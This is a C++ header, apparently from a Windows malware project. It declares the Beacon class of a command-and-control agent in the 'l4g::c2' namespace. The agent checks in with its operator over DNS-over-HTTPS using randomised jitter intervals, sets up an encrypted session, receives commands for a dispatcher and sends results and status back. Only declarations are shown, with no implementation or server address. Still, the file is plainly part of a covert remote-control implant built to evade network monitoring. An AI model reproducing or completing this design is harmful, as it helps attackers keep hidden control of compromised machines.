#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>
#include <functional>
#include "doh_client.hpp"
#include "command_dispatch.hpp"
#include "../utils/crypto.hpp"

namespace l4g::c2 {

class Beacon {
public:
    Beacon(DohClient* doh, CommandDispatcher* dispatcher, const std::string& agent_id);
    ~Beacon();
    
    void start();
    void stop();
    
    void set_interval(uint32_t min_ms, uint32_t max_ms);
    void force_beacon();
    
    // Send status update
    bool send_status(const std::string& status_json);
    
    // Send command result
    bool send_result(uint32_t sequence, const CommandResult& result);
    
private:
    DohClient* doh_;
    CommandDispatcher* dispatcher_;
    std::string agent_id_;
    std::vector<uint8_t> session_key_;
    
    std::thread beacon_thread_;
    std::atomic<bool> running_{false};
    uint32_t min_interval_ = 2000;
    uint32_t max_interval_ = 8000;
    uint32_t sequence_ = 0;
    
    void beacon_loop();
    void jitter_sleep();
    bool establish_session();
    std::vector<uint8_t> build_beacon_payload();
    bool process_response(const std::vector<uint8_t>& response);
};

} // namespace l4g::c2